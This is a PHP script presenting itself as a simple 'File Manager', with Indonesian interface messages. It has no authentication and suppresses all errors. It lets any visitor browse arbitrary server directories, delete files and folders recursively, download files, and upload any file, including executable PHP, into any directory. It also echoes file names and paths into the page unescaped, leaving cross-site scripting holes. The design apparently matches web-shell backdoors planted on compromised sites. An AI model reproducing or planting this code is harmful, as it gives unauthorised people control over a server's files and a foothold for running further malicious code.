<?php
error_reporting(0);
session_start();

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$realPath = realpath($path);
if (!$realPath || !is_dir($realPath)) {
    die("Direktori tidak valid.");
}

// Handle Delete
if (isset($_GET['delete'])) {
    $deletePath = realpath($_GET['delete']);
    
    // Security checks
    if (!$deletePath) {
        die("Path tidak valid.");
    }
    
    if ($deletePath === $realPath || $deletePath === dirname($realPath)) {
        die("Tidak diizinkan menghapus direktori ini atau direktori parent.");
    }
    
    if (strpos($deletePath, $realPath) !== 0) {
        die("Tidak diizinkan menghapus di luar direktori saat ini.");
    }
    
    if (is_dir($deletePath)) {
        $it = new RecursiveDirectoryIterator($deletePath, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $file) {
            if ($file->isDir()) {
                @rmdir($file->getRealPath());
            } else {
                @unlink($file->getRealPath());
            }
        }
        @rmdir($deletePath);
    } elseif (is_file($deletePath)) {
        @unlink($deletePath);
    }
    
    $_SESSION['scroll_position'] = isset($_GET['scroll_pos']) ? (int)$_GET['scroll_pos'] : 0;
    header("Location: ?path=" . urlencode($realPath));
    exit();
}

// Set scroll position from session
$scrollScript = '';
if (isset($_SESSION['scroll_position'])) {
    $scrollScript = "<script>window.onload = function() { window.scrollTo(0, ".$_SESSION['scroll_position']."); }</script>";
    unset($_SESSION['scroll_position']);
}

echo <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --success: #4cc9f0;
            --danger: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
        }
        
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            margin: 0;
            padding: 20px;
            background-color: #f5f7fa;
            color: var(--dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        
        h1, h2, h3 {
            color: var(--primary);
            margin-top: 0;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }
        
        .breadcrumb {
            font-size: 14px;
            color: var(--gray);
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .file-list {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        
        .file-list th {
            background-color: var(--primary);
            color: white;
            padding: 12px 15px;
            text-align: left;
        }
        
        .file-list td {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
        }
        
        .file-list tr:hover {
            background-color: #f8f9fa;
        }
        
        .file-list .icon {
            margin-right: 8px;
            font-size: 18px;
        }
        
        .file-list .folder {
            color: var(--primary);
        }
        
        .file-list .file {
            color: var(--gray);
        }
        
        .action-btn {
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .action-btn.delete {
            background-color: var(--danger);
        }
        
        .action-btn.delete:hover {
            background-color: #d1145a;
        }
        
        .action-btn.nav {
            background-color: var(--secondary);
        }
        
        .action-btn.nav:hover {
            background-color: #3730a3;
        }
        
        .panel {
            background: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        
        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background-color: var(--secondary);
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 5px;
            margin-bottom: 15px;
        }
        
        .alert-success {
            background-color: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }
        
        .alert-danger {
            background-color: #fee2e2;
            color: #b91c1c;
            border: 1px solid #fecaca;
        }
        
        .permissions {
            font-family: monospace;
            background: #f3f4f6;
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📂 File Manager</h1>
            <div class="breadcrumb">
                <a href="?path=">Root</a> 
                {$realPath}
            </div>
        </div>
        
        {$scrollScript}
        
        <div class="panel">
            <h3>Current Location: {$realPath}</h3>
            
            <table class="file-list">
                <thead>
                    <tr>
                        <th>Permissions</th>
                        <th>Type</th>
                        <th>Name</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
HTML;

// Navigasi ke atas
if ($realPath !== '/') {
    $parent = dirname($realPath);
    echo <<<HTML
                    <tr>
                        <td></td>
                        <td><span class="icon">📁</span></td>
                        <td><a href="?path={$parent}" class="folder">.. (Parent Directory)</a></td>
                        <td></td>
                    </tr>
HTML;
}

// Tampilkan isi direktori
$items = @scandir($realPath) or die("Gagal membaca direktori.");
function getPerms($path) {
    $perms = fileperms($path);
    $info = ($perms & 0x4000) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

foreach ($items as $item) {
    if ($item == ".") continue;
    $itemPath = $realPath . DIRECTORY_SEPARATOR . $item;
    $perm = getPerms($itemPath);
    
    $deleteJs = "var pos=window.pageYOffset||document.documentElement.scrollTop;".
                "if(confirm('Yakin hapus ".(is_dir($itemPath)?"folder":"file")." {$item}?')) {".
                "window.location='?path=".urlencode($realPath)."&delete=".urlencode($itemPath)."&scroll_pos='+pos;}return false;";
    
    $type = is_dir($itemPath) ? 'folder' : 'file';
    $icon = is_dir($itemPath) ? '📁' : '📄';
    
    echo <<<HTML
                    <tr>
                        <td><span class="permissions">{$perm}</span></td>
                        <td><span class="icon">{$icon}</span></td>
                        <td>
HTML;

    if (is_dir($itemPath)) {
        echo "<a href='?path=" . urlencode($itemPath) . "' class='folder'>{$item}</a>";
    } else {
        echo $item;
    }
    
    echo <<<HTML
                        </td>
                        <td>
                            <a href="#" onclick="{$deleteJs}" class="action-btn delete">🗑️ Delete</a>
HTML;
    
    if (!is_dir($itemPath)) {
        echo " <a href='{$itemPath}' download class='action-btn nav'>⬇️ Download</a>";
    }
    
    echo <<<HTML
                        </td>
                    </tr>
HTML;
}

echo <<<HTML
                </tbody>
            </table>
        </div>
        
        <div class="panel">
            <h3>⬆️ Upload File</h3>
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <input type="file" name="file" class="form-control">
                </div>
                <button type="submit" name="upload" class="btn">Upload</button>
            </form>
        </div>
        
        <div class="panel">
            <h3>🗂️ Create New Folder</h3>
            <form method="POST">
                <div class="form-group">
                    <input type="text" name="foldername" placeholder="Folder name" class="form-control">
                </div>
                <button type="submit" name="makefolder" class="btn">Create Folder</button>
            </form>
        </div>
HTML;

// Handle Upload
if (isset($_POST['upload'])) {
    $file = $_FILES['file'];
    $dest = $realPath . DIRECTORY_SEPARATOR . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $dest)) {
        echo <<<HTML
        <div class="alert alert-success">
            ✅ Upload berhasil: {$file['name']}
        </div>
HTML;
    } else {
        echo <<<HTML
        <div class="alert alert-danger">
            ❌ Upload gagal.
        </div>
HTML;
    }
}

if (isset($_POST['makefolder'])) {
    $folder = trim($_POST['foldername']);
    $folder = preg_replace('/[^a-zA-Z0-9_-]/', '_', $folder);
    $newDir = $realPath . DIRECTORY_SEPARATOR . $folder;

    if ($folder === '') {
        echo <<<HTML
        <div class="alert alert-danger">
            ❌ Nama folder kosong.
        </div>
HTML;
    } elseif (file_exists($newDir)) {
        echo <<<HTML
        <div class="alert alert-danger">
            ❌ Folder sudah ada.
        </div>
HTML;
    } elseif (@mkdir($newDir, 0755)) {
        echo <<<HTML
        <div class="alert alert-success">
            ✅ Folder '{$folder}' berhasil dibuat.
        </div>
HTML;
    } else {
        echo <<<HTML
        <div class="alert alert-danger">
            ❌ Gagal membuat folder. Mungkin karena permission.
        </div>
HTML;
    }
}

echo <<<HTML
    </div>
</body>
</html>
HTML;
